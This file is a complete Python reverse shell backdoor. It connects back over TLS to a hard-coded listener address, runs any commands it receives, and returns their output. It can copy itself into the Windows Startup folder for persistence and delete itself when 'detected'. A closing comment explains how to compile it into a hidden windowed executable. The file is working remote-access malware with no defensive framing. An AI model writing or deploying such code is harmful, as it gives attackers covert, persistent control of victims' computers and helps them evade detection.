#!/usr/bin/env python
import subprocess, socket, sys, time, os, shlex, ssl
from random import randint

def fubar(platform):
	if platform == "nt":
		subprocess.Popen('DEL /F /S /Q /A '+sys.argv[0], shell=True)
	elif platform == "posix":
		subprocess.Popen('rm -rf '+sys.argv[0], shell=True)
	sys.exit(0)
	return

def winstart():
	appenv = os.getenv("APPDATA")
	# Change this dir based on Win version
	data = 'copy "'+sys.argv[0]+'" "'+appenv+'\Microsoft\Windows\Start Menu\Programs\Startup"'
	return data

def main():
	# openssl s_server -accept 443 -cert cacert.pen -key privkey.pem
	# Change these values to match your listening host machine
	host = "192.168.1.177"
	port = 443
	
	retry = 60 # This value corresponds to the time period in seconds in between connection attempts
	hostname = str(socket.gethostname())
	platorm = os.name
	time.sleep(randint(3, 20))
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	wrappedSocket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA")

	while True:
		try:
			wrappedSocket.connect((host, port))
			break
		except Exception, e:
			time.sleep(randint(10, retry))
			pass
	wrappedSocket.send("\n<Connection established to " + hostname + ", use 'qqq' to exit>\n")


	while 1:
		wrappedSocket.send("\n"+os.getcwd()+">")
		#Ensure this value is a (relatively) low power of 2
		try:
			data = wrappedSocket.recv(1280)
		except:
			break
		# Use this this to close the connection
		if data.startswith("qqq"):
			break
		elif data.startswith("winstart!"):
			data = winstart()
			pass
		# If detected use this to delete the file from the machine, should work even if file is renamed (Experimental...)
		elif data.startswith("FUBAR!"):
				wrappedSocket.send("Delete from: "+sys.argv[0]+"\n")
				fubar(platorm)
		# Working directory change 'hack'
		elif data.startswith("cd "):
			Dir = shlex.split(data)
			data = ""
			try:
				os.chdir(Dir[1])
			except:
				wrappedSocket.send("Unknown Dir or Drive\n")
			pass
		try:
			process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdout_val = process.stdout.read() + process.stderr.read()
			wrappedSocket.send(stdout_val)
		except:
			break
	while 1:
		try:
			wrappedSocket.close()
			break
		except:
			pass

	time.sleep(randint(10, 60))
	main()

if __name__ == "__main__":
    main()

#pyinstaller.exe --onefile --windowed pycurious.py